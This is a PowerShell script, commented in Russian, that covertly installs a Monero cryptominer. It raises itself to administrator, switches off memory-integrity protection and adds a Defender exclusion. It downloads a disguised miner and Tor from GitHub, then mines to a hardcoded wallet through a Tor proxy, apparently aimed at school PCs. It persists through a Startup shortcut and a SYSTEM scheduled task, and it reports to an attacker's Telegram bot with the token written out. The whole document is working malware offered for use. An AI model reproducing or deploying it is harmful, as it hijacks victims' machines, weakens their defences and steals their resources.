# 1. ПРОВЕРКА АДМИНА
if (-NOT ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator")) {
    $arguments = "-NoProfile -ExecutionPolicy Bypass -File `"$PSCommandPath`""
    Start-Process powershell -Verb runAs -ArgumentList $arguments
    Break
}

# 2. СНИМАЕМ ЗАПРЕТЫ И ВЫКЛЮЧАЕМ ЗАЩИТУ ПАМЯТИ (HVCI)
Set-ExecutionPolicy Bypass -Scope Process -Force
Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\DeviceGuard\Scenarios\HypervisorEnforcedCodeIntegrity" -Name "Enabled" -Value 0 -ErrorAction SilentlyContinue

# 3. КОНФИГУРАЦИЯ
$path = "C:\ProgramData\SystemLib"
$wallet = "429bPnUKuYBQQVHoap1jKTWwiPfGuKAqL7ggbTFFZdbA3LyKScc6EnP9fTVeig7jNqaF7CFhUk5eCU8S5d85gWqU6Zt6bhA"
$user = "Isfandiyor0112-star"
$tgToken = "8260191816:AAE2rSVeuDnNG8nt4V-3vGjtfil3_ksqMwE"
$chatId = "6881699459"
$startupFile = "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\WinSystem.url"

# 4. КОМАНДЫ ПРОФИЛЯ + ФУНКЦИИ
$profilePath = "$HOME\Documents\WindowsPowerShell\Microsoft.PowerShell_profile.ps1"
$profileDir = Split-Path $profilePath
if (!(Test-Path $profileDir)) { New-Item -Type Directory -Path $profileDir -Force | Out-Null }

$Functions = @"
function send-tg {
    param([string]`$msg)
    `$url = "https://api.telegram.org/bot$tgToken/sendMessage"
    `$body = @{ chat_id = "$chatId"; text = "[`$env:COMPUTERNAME]: `$msg" }
    try { Invoke-RestMethod -Uri `$url -Method Post -Body `$body -ErrorAction SilentlyContinue } catch {}
}

function check {
    `$p = Get-Process "WinDirectX" -ErrorAction SilentlyContinue
    `$t = Get-Process "tor" -ErrorAction SilentlyContinue
    `$status = if (`$p) { "МАЙНЕР: OK (" + [Math]::Round(`$p.WorkingSet64 / 1MB, 2) + " MB)" } else { "МАЙНЕР: OFF" }
    `$status += if (`$t) { " | TOR: OK" } else { " | TOR: OFF" }
    Write-Host `$status -ForegroundColor Green
    send-tg "Ручной чек: `$status"
}

function delete {
    Stop-Process -Name "WinDirectX", "tor" -Force -ErrorAction SilentlyContinue
    Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\DeviceGuard\Scenarios\HypervisorEnforcedCodeIntegrity" -Name "Enabled" -Value 1 -ErrorAction SilentlyContinue
    Remove-Item -Path "$path" -Recurse -Force -ErrorAction SilentlyContinue
    if (Test-Path "$startupFile") { Remove-Item "$startupFile" -Force }
    Write-Host "Всё удалено, автозагрузка очищена!" -ForegroundColor Yellow
    send-tg "⚠️ СИСТЕМА ПОЛНОСТЬЮ УДАЛЕНА С ПК"
}
"@
$Functions | Out-File -FilePath $profilePath -Force -Encoding utf8

# 5. ЗАГРУЗКА
if (!(Test-Path $path)) { New-Item -ItemType Directory -Path $path -Force | Out-Null }
Add-MpPreference -ExclusionPath $path -ErrorAction SilentlyContinue

$web = New-Object System.Net.WebClient
$web.Headers.Add("User-Agent", "Mozilla/5.0")
if (!(Test-Path "$path\WinDirectX.exe")) { $web.DownloadFile("https://github.com/$user/sminers/raw/main/WinDirectX", "$path\WinDirectX.exe") }
if (!(Test-Path "$path\tor.exe")) { $web.DownloadFile("https://github.com/$user/sminers/raw/main/tor", "$path\tor.exe") }

# 6. СОЗДАНИЕ ЗАПУСКА И АВТОЗАГРУЗКИ
$cmd = "@echo off`nstart /b $path\tor.exe --SocksPort 9050 --Quiet`ntimeout /t 45 /nobreak >nul`nstart /b /low $path\WinDirectX.exe -o gulf.moneroocean.stream:443 -u $wallet -p school_pc --algo rx/0 --tls --proxy=socks5://127.0.0.1:9050 --no-huge-pages --max-cpu-usage 50"
$cmd | Out-File -FilePath "$path\run_cache.bat" -Encoding ascii
"Set WshShell = CreateObject(`"WScript.Shell`")`nWshShell.Run `"$path\run_cache.bat`", 0, False" | Out-File -FilePath "$path\win_start.vbs" -Encoding ascii

# Создаем ярлык в автозагрузке
$shortcut = "[InternetShortcut]`nURL=file:///$path\win_start.vbs"
$shortcut | Out-File -FilePath $startupFile -Encoding ascii

# 6.1 НАСТРОЙКА ПЛАНИРОВЩИКА (ЗАПУСК ПРИ ВКЛЮЧЕНИИ)
$TaskName = "WinSystemUpdate"
$TaskAction = New-ScheduledTaskAction -Execute "wscript.exe" -Argument "`"$path\win_start.vbs`""
$TaskTrigger = New-ScheduledTaskTrigger -AtStartup # Запуск при включении системы
$TaskSettings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -StartWhenAvailable

# Регистрируем задачу от имени СИСТЕМЫ (будет работать всегда)
Register-ScheduledTask -TaskName $TaskName -Action $TaskAction -Trigger $TaskTrigger -Settings $TaskSettings -User "SYSTEM" -RunLevel Highest -Force

Write-Host "Планировщик настроен: запуск при включении ПК активирован." -ForegroundColor Cyan


# 7. ПИТАНИЕ, СТАРТ И МОНИТОРИНГ
powercfg /x -monitor-timeout-ac 5
powercfg /x -standby-timeout-ac 0
Start-Process -FilePath "$path\win_start.vbs"

# ФОНОВЫЙ ЦИКЛ ОТЧЕТОВ
$Monitor = {
    param($pcName) # Принимаем имя компа из основного скрипта
    while($true) {
        # СНАЧАЛА проверяем и отправляем, потом спим
        $p = Get-Process "WinDirectX" -ErrorAction SilentlyContinue
        $msg = if ($p) { "✅ Статус: Работаю (" + [Math]::Round($p.WorkingSet64 / 1MB, 2) + " MB)" } else { "⚠️ СТАТУС: МАЙНЕР ВЫЛЕТЕЛ!" }
        
        $url = "https://api.telegram.org/bot8260191816:AAE2rSVeuDnNG8nt4V-3vGjtfil3_ksqMwE/sendMessage"
        $body = @{ chat_id = "6881699459"; text = "[$pcName]: $msg" }
        
        try { 
            Invoke-RestMethod -Uri $url -Method Post -Body $body -ErrorAction SilentlyContinue 
        } catch {}

        Start-Sleep -Seconds 3600 # Спим час ПОСЛЕ отправки
    }
}

# Запускаем Job и передаем имя компа внутрь через -ArgumentList
Start-Job -ScriptBlock $Monitor -ArgumentList $env:COMPUTERNAME

# Уведомление о старте
$urlStart = "https://api.telegram.org/bot$tgToken/sendMessage"
$bodyStart = @{ chat_id = $chatId; text = "[$env:COMPUTERNAME]: 🚀 СКРИПТ АКТИВИРОВАН! Мониторинг запущен." }
Invoke-RestMethod -Uri $urlStart -Method Post -Body $bodyStart -ErrorAction SilentlyContinue

Write-Host "--- ВСЁ ГОТОВО (ОТЧЕТЫ БУДУТ ПРИХОДИТЬ СРАЗУ) ---" -ForegroundColor Magenta
